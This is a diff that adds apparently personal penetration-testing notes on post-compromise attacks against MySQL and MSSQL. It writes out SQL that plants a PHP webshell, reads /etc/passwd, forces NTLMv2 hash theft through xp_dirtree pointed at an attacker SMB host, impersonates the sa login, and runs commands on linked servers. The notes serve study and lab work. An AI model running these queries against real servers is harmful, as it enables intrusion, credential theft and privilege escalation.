@@ -91,3 +91,172 @@ SQL supports **User Defined Functions** which allows us to execute C/C++ code wi
 
 ## Write Local Files
 
+MySQL doesn't have something like `xp_cmdshell`, but we can achieve command execution if we write into a local file on the system that can execute our commands. For example, suppose that the `MySQL` operates on a PHP-based webserver or an ASP.NET one. If we have the appropriate privileges we can attempt to write a file using `SELECT INTO OUTFILE` in the webserver directory.
+
+```sql
+SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
+```
+
+In `MySQL`, a global system variable `secure_file_priv` limits the effect of data import/export operations like, `LOAD DATA`, and `SELECT ... INTO OUTFILE` statements, and the `LOAD_FILE()` function. These operations are only permitted for users who have the **FILE** privilege.
+
+`secure_file_priv` may be set as follows:
+
+- If empty, the variable has no effect, which is not a secure setting.
+- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
+- If set to NULL, the server disables import and export operations.
+
+```sql
+show variable like "secure_file_priv"
+```
+
+---
+
+To Write file using `MSSQL`, we need to enable [Ole Automation Procedures](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), which requires admin privileges, and then execute some stored procedures to create the file:
+
+```sql
+sp_configure 'show advanced options', 1
+GO
+
+RECONFIGURE
+GO
+
+sp_configure 'Ole Automation Procedures', 1
+GO
+
+RECONFIGURE
+GO
+```
+
+#### MSSQL - Create a File
+
+```sql
+DECLARE @OLE INT 
+
+DECLARE @FileID INT 
+
+EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT 
+
+EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1 
+
+EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>' 
+
+EXECUTE sp_OADestroy @FileID 
+
+EXECUTE sp_OADestroy @OLE 
+
+GO
+```
+
+## Read Local Files
+
+### MSSQL
+
+By default, `MSSQL` allows reading any file on the system if the user has sufficient permissions to read it
+
+```sql
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+
+GO
+```
+
+### MySQL
+
+By default, `MySQL` does not allow arbitrary file read, but with correct settings and approprate privileges set, we can read files using the following method:
+
+```sql
+select LOAD_FILE("/etc/passwd");
+```
+
+## Capture MSSQL Service Hash
+
+MSSQL Service Account hash can be stolen using the procedures `xp_subdirs` or `xp_dirtree` 
+which use the SMB protocol to retrieve a list of child directories under a specified parent directory.
+When we use one of these to point it to our server. It will force the target to authenticate and send the NTLMv2 hash of the service account running the SQL Server to our server.
+
+To make this work we can use `Responder` and `impacket-smbserver` and execute one of the following queries:
+#### XP_DIRTREE Hash Stealing
+
+```mysql
+EXEC master..xp_dirtree '\\10.10.110.17\share'
+GO
+```
+#### XP_SUBDIRS Hash Stealing
+
+```mysql
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+GO
+```
+
+#### XP_SUBDIRS Hash Stealing with Responder
+
+![[stealing hash with Responder.png]]
+#### XP_SUBDIRS Hash Stealing with impacket
+
+![[stealing hash with impacket.png]]
+
+## Impersonate Existing Users with MSSQL
+
+`IMPERSONATE` allows the executing user to take on the permission of another user or login until the context is reset or session dies.
+
+Sysadmins can impersonate anyone by default. But, for non-admin users, the permissions must be set explicitly.
+
+We can use the following query to identify users we can impersonate:
+
+```sql
+SELECT distinct b.name 
+FROM sys.server_permissions a 
+INNER JOIN sys.server_principals b 
+ON a.grantor_principal_id = b.principal_id 
+WHERE a.permission_name = 'IMPERSONATE' 
+GO
+```
+
+#### Verifying our Current User and Role
+
+```sql
+SELECT SYSTEM_USER 
+SELECT IS_SRVROLEMEMBER('sysadmin') 
+go
+```
+
+If the resulting output was `0`. Then our user doesn't have the sysadmin role.
+#### Impersonating a User
+
+```sql
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER 
+SELECT IS_SRVROLEMEMBER('sysadmin') 
+GO
+```
+
+```ad-important
+It is recommended to run **EXECUTE AS LOGIN** inside the `master` DB. Because if the user we are trying to impersonate doesn't have access to the current DB, the impersonation will result in an error. All users, by default, has access to `master` DB.
+```
+
+And to get back to our session, we can user the command `REVERT`.
+
+## Communicate with Other Databases with MSSQL
+
+`MSSQL` has a configuration option called **linked servers**. Linked servers are configured to allow the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database such as Oracle.
+#### Identify linked Servers in MSSQL
+
+```sql
+SELECT srvname, isremote FROM sysservers 
+GO
+```
+
+**Output:**
+
+![[isremote_output.png]]
+
+The [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets (`[ ]`).
+
+```sql
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS] 
+GO
+```
+
+```ad-info
+If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
+```
+
